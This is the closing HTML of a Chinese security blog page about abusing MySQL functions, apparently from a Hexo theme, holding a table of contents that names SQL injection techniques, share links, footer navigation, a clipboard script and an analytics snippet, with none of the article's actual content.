+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#函数使用"><span class="toc-number">1.</span> <span class="toc-text">函数使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入、布尔盲注与延时注入"><span class="toc-number">3.</span> <span class="toc-text">联合注入、布尔盲注与延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#函数在注入过程中的利用"><span class="toc-number">4.</span> <span class="toc-text">函数在注入过程中的利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql的udf"><span class="toc-number">5.</span> <span class="toc-text">mysql的udf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示："><span class="toc-number">6.</span> <span class="toc-text">演示：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql的xp-cmdshell与sp-oacreate"><span class="toc-number">7.</span> <span class="toc-text">mssql的xp_cmdshell与sp_oacreate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&text=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&is_video=false&description=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql函数的利用&body=Check out this article: https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&name=mysql函数的利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Rj45
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?539c6b41d72f90d25e5ad9d0db4f2321";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
